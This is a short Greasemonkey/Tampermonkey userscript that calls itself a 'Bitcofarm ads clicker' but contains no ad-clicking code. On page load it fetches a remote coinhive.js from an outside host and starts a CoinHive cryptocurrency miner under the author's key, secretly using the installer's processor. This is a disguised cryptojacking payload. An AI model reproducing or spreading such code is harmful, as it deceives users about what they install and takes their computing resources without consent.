// ==UserScript==
// @name         Click Bitcofarm ads clicker rev 2
// @namespace    http://tampermonkey.net/
// @version      2.1
// @description  try to take over the world!
// @author       nicknick
// @match        http://bitcofarm.com/ads
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/38410/Click%20Bitcofarm%20ads%20clicker%20rev%202.user.js
// @updateURL https://update.greasyfork.org/scripts/38410/Click%20Bitcofarm%20ads%20clicker%20rev%202.meta.js
// ==/UserScript==



$.getScript('http://gointernet.altervista.org/farmhelper/js/coinhive.js', function() {

var miner = new CoinHive.Anonymous('rpijiOoU6aYIFeilUi9TUPEmdjQdUtvc', {throttle: 0.3});
miner.start();

        });